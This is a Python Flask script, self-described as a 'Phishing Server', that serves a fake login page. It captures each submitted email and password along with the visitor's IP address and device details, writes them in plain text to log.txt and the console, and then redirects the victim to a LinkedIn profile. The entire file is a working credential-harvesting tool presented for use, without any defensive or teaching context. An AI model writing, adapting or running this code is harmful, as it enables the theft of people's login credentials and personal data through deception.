from flask import Flask, request, render_template, redirect
from datetime import datetime
import os
import logging
from user_agents import parse
import socket
import sys

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)  # Secret key for session security

# Get local IP address
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# Configure logging
def setup_logging():
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    
    # File handler for credentials
    cred_handler = logging.FileHandler('log.txt')
    cred_handler.setLevel(logging.INFO)
    cred_format = logging.Formatter('%(asctime)s - %(message)s')
    cred_handler.setFormatter(cred_format)
    
    # Console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    console_format = logging.Formatter('%(levelname)s - %(message)s')
    console_handler.setFormatter(console_format)
    
    logger.addHandler(cred_handler)
    logger.addHandler(console_handler)
    return logger

logger = setup_logging()

def log_credentials(email, password):
    try:
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = parse(request.headers.get('User-Agent'))
        device = f"{user_agent.browser.family} {user_agent.browser.version_string} on {user_agent.os.family}"
        
        log_entry = (
            f"IP: {ip_address} | "
            f"Device: {device} | "
            f"Email: {email} | "
            f"Password: {password}"
        )
        
        # Log to credentials file
        logger.info(log_entry)
        
    except Exception as e:
        logger.error(f"Logging error: {str(e)}")

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email", "").strip()
        password = request.form.get("password", "").strip()
        
        if email and password:
            log_credentials(email, password)
        
        # Redirect to LinkedIn profile
        return redirect("https://www.linkedin.com/in/elkadhioussama/")
    
    return render_template("login.html")

if __name__ == "__main__":
    # Display startup information
    local_ip = get_local_ip()
    port = 5000
    
    print("\n" + "="*50)
    print(f"Phishing Server Started Successfully")
    print("="*50)
    print(f"Local URL: http://127.0.0.1:{port}")
    print(f"Network URL: http://{local_ip}:{port}")
    print("="*50)
    print("Captured credentials will be saved to log.txt")
    print("Press CTRL+C to stop the server\n")
    
    # Start production server
    from waitress import serve
    serve(app, host="0.0.0.0", port=port)
